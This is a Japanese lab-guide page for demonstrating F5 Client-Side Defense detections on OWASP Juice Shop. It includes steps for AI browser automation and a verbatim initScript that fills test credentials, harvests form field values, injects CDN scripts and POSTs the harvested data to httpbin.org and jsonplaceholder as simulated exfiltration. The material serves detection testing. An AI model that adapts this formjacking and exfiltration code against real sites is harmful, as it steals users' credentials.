## トリガー検出

CSDはブラウザ内のJavaScript動作を監視します。WAFやBot Defenseと異なり、curlコマンドでCSD検出をトリガーすることはできません。実ブラウザ側のスクリプト活動が必要です。以下の統合スクリプトは、フォームフィールド収集、複数CDNドメインからのサードパーティスクリプト注入、および外部エンドポイントへのデータ流出の3つすべてのCSD検出信号をトリガーします。

### AI自動実行

ブラウザオートメーションツール（MCP Chrome DevTools、Playwright、Puppeteer）を備えたAIアシスタントは、上記の手動ステップの代わりにシミュレーションをプログラムで実行します：

1. **initScriptで移動** — 最初に`about:blank`に移動して明確なドキュメントコンテキストを確保し、その後ログインページURL（例：`http://$F5XC_DOMAINNAME/#/login`）に`navigate_page`を実行します。`initScript`はzone.jsがネイティブ`setInterval`、`clearInterval`、`fetch`、`console.log`をパッチする前に保存し、ログインフォームフィールドをポーリングし、ネイティブ`HTMLInputElement.prototype.value`セッターを通じて認証情報を入力し、統合検出スクリプトをインラインで即座に実行します。以下の逐語的なinitScriptを使用してください。
2. **ウェルカムバナーを閉じる** — **Escape**キーで`press_key`を使用して、ウェルカムバナーを閉じます。後続の訪問ではバナーが表示されない場合があります（クッキーが永続化）
3. **完了を待つ** — すべてのCDNスクリプトロード/エラーコールバックおよびfetchプロミスの解決を完了するまで10秒待機します
4. **証拠をキャプチャ** — `list_console_messages`で`[CSD Demo] Simulation complete`を確認し、`list_network_requests`を`script`と`fetch`タイプでフィルタして、HTTPステータスコードを確認します

**initScriptハーネス（逐語的 — 統合検出スクリプトを自動実行用にラップします）：**

```javascript
// Save native references before zone.js patches them
var _si = window.setInterval.bind(window);
var _ci = window.clearInterval.bind(window);
var _fetch = window.fetch.bind(window);
var _log = window.console.log.bind(window.console);

// Poll for login form fields, fill credentials, run detection script
var _poll = _si(function() {
  var emailEl = document.querySelector('input[type="email"]');
  var passEl  = document.querySelector('input[type="password"]');
  if (emailEl && passEl) {
    _ci(_poll);
    // Fill credentials via native setter (bypasses zone.js)
    var nativeSet = Object.getOwnPropertyDescriptor(
      window.HTMLInputElement.prototype, 'value').set;
    nativeSet.call(emailEl, 'test@example.com');
    emailEl.dispatchEvent(new Event('input', { bubbles: true }));
    nativeSet.call(passEl, 'P@ssword123');
    passEl.dispatchEvent(new Event('input', { bubbles: true }));

    // Run Combined Detection Script inline using native fetch for exfil
    (function() {
      _log('==================================================');
      _log('[CSD Demo] Combined Detection Script — Starting');
      _log('==================================================');

      _log('\n[Formjack] Phase 1: Form field harvesting');
      var inputs = document.querySelectorAll('input');
      var harvested = {};
      inputs.forEach(function(input) {
        var name = input.name || input.id || input.type;
        harvested[name] = input.value || '(empty)';
      });
      _log('[Formjack] Harvested ' + Object.keys(harvested).length + ' fields:', harvested);

      _log('\n[Supply Chain] Phase 2: Multi-CDN script injection');
      var cdns = [
        { url: 'https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js', name: 'jsdelivr' },
        { url: 'https://esm.sh/moment@2.30.1', name: 'esm.sh' },
        { url: 'https://unpkg.com/underscore@1.13.7/underscore-min.js', name: 'unpkg' },
        { url: 'https://ga.jspm.io/npm:dayjs@1.11.13/dayjs.min.js', name: 'jspm' }
      ];
      cdns.forEach(function(cdn) {
        var script = document.createElement('script');
        script.src = cdn.url;
        script.onload = function() { _log('[Supply Chain] Loaded from ' + cdn.name + ': ' + cdn.url); };
        script.onerror = function() { _log('[Supply Chain] Blocked/failed from ' + cdn.name + ': ' + cdn.url); };
        document.head.appendChild(script);
        _log('[Supply Chain] Injected script tag: ' + cdn.name);
      });

      _log('\n[Exfil] Phase 3: Data exfiltration');
      var payload = JSON.stringify({
        type: 'combined_demo', credentials: harvested,
        page: window.location.href, timestamp: Date.now()
      });
      _fetch('https://www.httpbin.org/post', { method: 'POST', mode: 'no-cors', body: payload })
        .then(function() { _log('[Exfil] Data sent to www.httpbin.org'); });
      _fetch('https://jsonplaceholder.typicode.com/posts', {
        method: 'POST', mode: 'no-cors',
        headers: { 'Content-Type': 'application/json' }, body: payload
      }).then(function() { _log('[Exfil] Data sent to jsonplaceholder.typicode.com'); });

      _log('\n==================================================');
      _log('[CSD Demo] Simulation complete');
      _log('[CSD Demo] Fields harvested: ' + Object.keys(harvested).length);
      _log('[CSD Demo] Scripts injected: 4 (4 CDN domains)');
      _log('[CSD Demo] Exfil channels: 2 (fetch POST)');
      _log('==================================================');
    })();
  }
}, 300);
```

**ネイティブ`fetch`に関する注記：** このハーネスは`window.fetch.bind(window)`を保存して、zone.jsエラーを回避します。これはすべての攻撃シミュレーションフェーズの正しい動作です。CSD緩和はスクリプトロード（`<script>`タグの`src`値をクリアすることで）をブロックします。`fetch()`呼び出しはブロックしないため、ネイティブfetch参照を保存しても、緩和動作には影響しません。同じinitScriptがフェーズ2および3に使用されます。

<Aside type="caution">
**zone.js非互換性** — Juice ShopはAngularのzone.jsを使用します。これは`setTimeout`、`setInterval`、`fetch`、`XMLHttpRequest`、およびその他のブラウザAPIをパッチします。これはMCPの`evaluate_script`、`fill`、`click`ツールを`Cannot read properties of undefined (reading 'call')`で破壊します。代わりに`navigate_page`と`initScript`を使用してください — `initScript`はzone.jsがロードされる前に実行されるため、ネイティブAPI参照を保存できます。initScriptは（`fill`ツールではなく）ネイティブ`HTMLInputElement.prototype.value`セッターを使用してフォームフィールドを入力し、`setInterval`コールバック内で検出スクリプトをインラインで実行する必要があります。
</Aside>

<Aside type="note">
**initScript累積** — `initScript`パラメータ付きの各`navigate_page`呼び出しはスクリプトを永続リストに追加し、そのブラウザコンテキストのすべての後続ドキュメントロード上で実行されます。古いスクリプトの干渉を回避するには、実行間に`about:blank`に移動するか、クリーンコンテキストために`new_page`と`isolatedContext`を使用してください。
</Aside>

ブラウザオートメーションツールを持たないオペレータは、上記の手動ステップを使用します。

<Aside type="tip">
検出は、CSDダッシュボードに表示されるまで**5～10分**かかります。スクリプト実行後、アラートがまだ表示されていない場合は、[CSDコンソールウォークスルー](/csd/csd-console/)を続行して、後で確認してください。
</Aside>

### スクリプトの処理内容

統合シミュレーションは3つすべてのCSD検出信号をトリガーします：

| 動作 | スクリプトの処理 | CSDが認識するもの |
| --- | --- | --- |
| **フィールド収集** | 既存の`input`要素（メール、パスワード）から値を読み取る | 機密フォームフィールドを読み取るスクリプト — 高リスクとしてフラグ付け |
| **スクリプト注入** | 4つの`<script>`タグを`cdn.jsdelivr.net`、`esm.sh`、`unpkg.com`、`ga.jspm.io`からロードするよう追加 | ページ上の4つの新しいサードパーティスクリプトドメイン |
| **データ流出** | `fetch`を使用して収集されたデータを`www.httpbin.org`および`jsonplaceholder.typicode.com`に送信 | 外部ドメインへのネットワークコール（注：fetchの宛先はネットワークドメインビューではなく、スクリプトネットワークインタラクションとして表示されます） |

<Aside type="note">
CSDには特定の検出境界があります — 例えば、ページロードDOMフィールドのみが追跡され、ネットワークビューにはスクリプトロードドメインのみが表示されます。完全なリストについては、[検出の境界](/csd/overview/#detection-boundaries)を参照してください。
</Aside>

### 高度なシミュレーション

上記の統合スクリプトは、ほとんどのデモに適した簡略版の3フェーズ版（収集、注入、流出）です。[攻撃スクリプトライブラリ](/csd/attack-scripts/)は、攻撃タイプ別に整理された10個の対象スクリプトを提供します。統合スクリプトのカバレッジに加えて、DOM操作、クッキー流出、イメージビーコンチャネルを追加する**最大検出**ストレステストが含まれています。個別のスクリプトを使用して、特定の攻撃カテゴリ（フォームジャッキング、デジタルスキミング、サプライチェーン注入、データ流出、DOM操作）を単独で実証してください。
